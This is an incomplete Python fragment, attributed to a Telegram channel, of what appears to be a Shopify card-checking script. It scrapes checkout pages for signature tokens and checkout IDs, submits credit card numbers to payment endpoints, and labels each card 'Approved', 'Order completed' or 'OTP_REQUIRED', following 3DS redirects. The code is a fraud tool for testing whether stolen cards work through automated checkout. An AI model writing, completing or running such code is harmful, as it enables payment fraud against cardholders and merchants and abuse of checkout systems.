...
Channel: syncchats.t.me
    ...
    async with client as session:
        try:
            ...
            # Extract identificationSignature JWT from checkout HTML (Fix 2)
            identification_signature = None
            _sig_m = re.search(r'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;(eyJ[^&"]{20,})', response_text)
            if not _sig_m:
                _sig_m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"(eyJ[^"]{20,})', response_text)
            if not _sig_m:
                _sig_m = re.search(r'"identificationSignature":"(eyJ[^"]{20,})', response_text)
            if _sig_m:
                identification_signature = _sig_m.group(1)

            # Extract build_id and checkout_id from checkout HTML (Fix 3)
            build_id = None
            _bid_m = re.search(r'buildId":"([^"]+)"', response_text)
            if not _bid_m:
                _bid_m = re.search(r'__NEXT_DATA__.*?"buildId":"([^"]+)"', response_text, re.DOTALL)
            if not _bid_m:
                _bid_m = re.search(r'/_next/static/([^/]+)/_', response_text)
            if _bid_m:
                build_id = _bid_m.group(1)
            if not build_id:
                build_id = "4f6009c7de11ce7b5e3ba3ad69fd4f8be89d2f53"

            checkout_id = find_between(response_text, 'checkoutId&quot;:&quot;', '&quot;')
            if not checkout_id:
                checkout_id = find_between(response_text, '"checkoutId":"', '"')
            if not checkout_id:
                _cid_m = re.search(r'/checkouts/(\w+)', response_text)
                if _cid_m:
                    checkout_id = _cid_m.group(1)
            if not checkout_id:
                checkout_id = token
            ...
            for endpoint in session_endpoints:
                try:
                    ...
                    if identification_signature:
                        pay_headers['shopify-identification-signature'] = identification_signature
                    json_data = {
                        'credit_card': {
                            'number': cc,
                            'month': month,
                    ...
                    pay_resp = await session.post(endpoint, headers=pay_headers, json=json_data)
            ...
            for attempt in range(2):
                ...
                # Fix 4: Check __typename NOW — polling a 3DS receipt that was never
                # completed returns GENERIC_ERROR, masking the real OTP result.
                if receipt:
                    ...
                    if r_typename == 'ActionRequiredReceipt':
                        ...
                        return result
                    if r_typename == 'ProcessedReceipt':
                        print(f"\033[92m✅ Approved: {receipt.get('token', 'N/A')}\033[0m")
                        result["Response"] = "Order completed 💎"
                        result["details"]["order_id"] = receipt.get('token')
                        return result
                    if r_typename == 'FailedReceipt':
                    ...
                    for poll in range(10):
                        ...
                        if poll_resp.status_code == 200:
                            ...
                            if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                ...
                                print(f"\033[92m✅ 3D required\033[0m")
                                result["Response"] = "OTP_REQUIRED"
                                # Check for offsiteRedirect
                                action = receipt.get('action')
                                if action and action.get('offsiteRedirect'):
                                    result["details"]["redirect_url"] = action['offsiteRedirect']['url']
                                return result
                                ...
                                if err.get('code') == 'CAPTCHA_REQUIRED':
                                    # This could be 3DS or a simple captcha – check for offsiteRedirect
                                    action = receipt.get('action')
                                    if action and action.get('offsiteRedirect'):
